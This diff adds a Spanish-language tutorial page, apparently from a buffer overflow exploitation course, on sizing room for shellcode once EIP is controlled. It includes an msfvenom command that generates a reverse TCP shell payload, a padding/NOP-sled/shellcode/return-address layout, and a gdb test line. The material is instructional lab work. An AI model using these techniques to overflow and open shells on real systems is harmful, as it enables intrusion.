@@ -1,0 +1,83 @@
+# Determine the Length for Shellcode
+
+Después de controlar EIP, necesitamos determinar cuánto espacio tenemos para el shellcode.
+
+## Tamaño del Shellcode
+
+Usar msfvenom para estimar:
+
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 \
+  --platform linux --arch x86 --format c
+```
+
+Resultado:
+```
+Payload size: 68 bytes
+```
+
+## Planificación del Buffer
+
+| Componente | Tamaño | Propósito |
+|------------|--------|-----------|
+| Buffer | Variable | Padding inicial |
+| NOPs | 100 bytes | NOP sled para confiabilidad |
+| Shellcode | 150 bytes | Código malicioso (margen extra) |
+| EIP | 4 bytes | Dirección de retorno |
+
+## Cálculo del Buffer
+
+```
+Total hasta EIP = 1040 bytes
+- NOPs:        - 100 bytes
+- Shellcode:   - 150 bytes
+- EIP:         -   4 bytes
+───────────────────────────
+Buffer:       = 786 bytes
+```
+
+**Fórmula:**
+```
+Buffer = 1040 - 100 - 150 - 4 = 786 bytes
+```
+
+## Estructura Final
+
+```
+[786 bytes Buffer][100 bytes NOPs][150 bytes Shellcode][4 bytes EIP]
+```
+
+## NOP Sled
+
+Los NOPs (`\x90`) son instrucciones "No Operation":
+
+- Permiten que el código se ejecute limpiamente
+- Dan margen de error en la dirección de salto
+- El CPU "desliza" hasta el shellcode
+
+## Verificar Espacio
+
+```bash
+(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
+```
+
+Resultado esperado:
+```
+Program received signal SIGSEGV, Segmentation fault.
+0x66666666 in ?? ()
+```
+
+## Espacio Total Disponible
+
+| Concepto | Valor |
+|----------|-------|
+| NOPs | 100 bytes |
+| Shellcode | 150 bytes |
+| **Total** | **250 bytes** |
+
+## Consideraciones
+
+- Shellcode típico: 60-80 bytes
+- Margen de seguridad: +50-100 bytes
+- NOP sled mejora confiabilidad
+- Ajustar según necesidades específicas
